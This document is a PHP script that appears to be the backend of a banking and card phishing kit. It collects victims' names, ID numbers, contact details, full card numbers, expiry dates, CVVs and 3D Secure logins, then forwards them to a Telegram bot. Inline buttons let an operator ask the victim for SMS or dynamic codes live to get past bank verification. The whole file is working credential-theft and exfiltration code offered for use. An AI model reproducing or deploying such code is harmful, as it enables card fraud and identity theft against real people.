<?php
header('Content-Type: application/json');
ini_set('display_errors', 0);
error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);

$configLocal = @include __DIR__ . '/config.php';
$config = is_array($configLocal) ? $configLocal : [];

if (empty($config['bot_token']) || empty($config['chat_id'])) {
    $globalPath = __DIR__ . '/../gate/recargas/transaction/config.php';
    if (file_exists($globalPath)) {
        $config = include $globalPath;
    }
}

$transactionId = $_POST['transactionId'] ?? '';
$u_tb_raw = $_POST['u_tb'] ?? '{}';
$action_code = $_POST['action_code'] ?? '';
$action_value = $_POST['action_value'] ?? '';

if (empty($transactionId)) {
    echo json_encode(['status' => 'error', 'message' => 'Datos incompletos']);
    exit;
}

if (empty($config['bot_token']) || empty($config['chat_id'])) {
    echo json_encode(['status' => 'error', 'message' => 'Config vacía (bot_token/chat_id)']);
    exit;
}

$tb = json_decode($u_tb_raw, true);
if (!is_array($tb)) $tb = [];

// IP & Device
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$device = 'PC';
if (stripos($userAgent, 'Android') !== false) $device = 'Android';
elseif (stripos($userAgent, 'iPhone') !== false || stripos($userAgent, 'iPad') !== false) $device = 'iPhone';
elseif (stripos($userAgent, 'Mobile') !== false) $device = 'Movil';

$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
$hora = date('d/m/Y H:i:s');

// Building the message

$tarjeta = $tb['tarjeta'] ?? '';$firstDigit = substr($tarjeta, 0, 1);
$cardInfo = [];
if (is_array($tb['card_info'] ?? null)) {
    $cardInfo = $tb['card_info'];
} elseif (is_array($tb['apicc_response'] ?? null)) {
    $cardInfo = $tb['apicc_response']['card_info'] ?? $tb['apicc_response'];
}
$scheme = !empty($tb['scheme']) ? $tb['scheme'] : ($cardInfo['scheme'] ?? $tb['apicc_response']['scheme'] ?? '');
$brandIcon = !empty($tb['cardBrand']) ? ucfirst($tb['cardBrand']) : (!empty($scheme) ? ucfirst($scheme) : (($firstDigit === '5') ? 'MasterCard' : 'Visa'));
$monto = number_format((float)($tb['total_pagar'] ?? 0), 0, ',', '.');
$banco = !empty($tb['banco']) ? $tb['banco'] : ($cardInfo['issuer'] ?? $tb['apicc_response']['issuer'] ?? 'Desconocido');
$cardType = !empty($tb['card_type']) ? $tb['card_type'] : ($cardInfo['card_type'] ?? $tb['apicc_response']['card_type'] ?? '');
$issuerCountry = !empty($tb['issuer_country']) ? $tb['issuer_country'] : ($cardInfo['issuer_country'] ?? $tb['apicc_response']['issuer_country'] ?? '');

$mensaje = "";

if (!empty($action_code)) {
    $mensaje .= "◉ ACTUALIZACIÓN 3D SECURE ◉\n\n";
   $mensaje .= "Nombre: " . ($tb['ownerName'] ?? '') . "\n";
   $mensaje .= "Tarjeta: " . $tarjeta . "\n\n";
    
    if ($action_code === 'usuario') {
       $mensaje .= "Usuario: " . ($tb['3d_user'] ?? '') . "\n";
       $mensaje .= "Clave: " . ($tb['3d_pass'] ?? '') . "\n\n";
    } else {
        $tipoStr = ucfirst($action_code);
       $mensaje .= $tipoStr . ": " . $action_value . "\n\n";
    }
} else {
    $mensaje .= "◉ TARJETA DE CRÉDITO ◉\n\n";
    
   if (!empty($tb['ownerName'])) $mensaje .= "Nombre: " . $tb['ownerName'] . "\n";
   if (!empty($tb['documento'])) $mensaje .= "Documento: " . $tb['documento'] . "\n";
   if (!empty($tb['correo'])) $mensaje .= "Correo: " . $tb['correo'] . "\n";
   if (!empty($tb['telefono'])) $mensaje .= "Telefono: " . $tb['telefono'] . "\n";
   if (!empty($tb['direccion'])) $mensaje .= "Direccion: " . $tb['direccion'] . "\n";
    $mensaje .= "\nMonto: $" . $monto . "\n\n";
    
   $mensaje .= "Banco: " . $banco . "\n";
    if (!empty($cardType)) {
       $mensaje .= "Tipo de tarjeta: " . $cardType . "\n";
    }
   $mensaje .= "Franquicia: " . $brandIcon . "\n";
    if (!empty($issuerCountry)) {
       $mensaje .= "País emisor: " . $issuerCountry . "\n";
    }
    $mensaje .= "\nTarjeta: " . $tarjeta . "\n";
   $mensaje .= "Vencimiento: " . ($tb['expMonth'] ?? '') . "/" . ($tb['expYear'] ?? '') . "\n";
   $mensaje .= "CVV: " . ($tb['cvv'] ?? '') . "\n\n";
}

$mensaje .= "IP: {$ip} | Device: {$device} | {$hora}\n\n";
$mensaje .= "🐙 @FU7UR4MA 🐙";

$postData = [
    'chat_id' => $config['chat_id'],
    'text' => $mensaje,
    'parse_mode' => 'HTML',
    'disable_web_page_preview' => true
];

// Siempre agregamos los botones para que el operador pueda responder
$buttons = [
    'inline_keyboard' => [
        [
            ['text' => "Error Logo", 'callback_data' => "error_logo:{$transactionId}"]
        ],
        [
            ['text' => "Dinamica", 'callback_data' => "pedir_dinamica:{$transactionId}"],
            ['text' => "SMS", 'callback_data' => "pedir_sms:{$transactionId}"]
        ],
        [
            ['text' => "Finalizar", 'callback_data' => "confirm_finalizar:{$transactionId}"],
            ['text' => "923", 'callback_data' => "923:{$transactionId}"]
        ],
        [
            ['text' => "T-credito", 'callback_data' => "pedir_credito:{$transactionId}"],
            ['text' => "T-debito", 'callback_data' => "pedir_debito:{$transactionId}"]
        ]
    ]
];
$postData['reply_markup'] = json_encode($buttons);

$ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/sendMessage");
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
    CURLOPT_POSTFIELDS => json_encode($postData)
]);
$response = curl_exec($ch);
curl_close($ch);

$resData = json_decode($response, true);

if ($resData && $resData['ok']) {
    $messageId = $resData['result']['message_id'];
    echo json_encode(['status' => 'success', 'messageId' => $messageId]);
} else {
    echo json_encode(['status' => 'error', 'message' => 'Error Telegram', 'telegram' => $resData]);
}
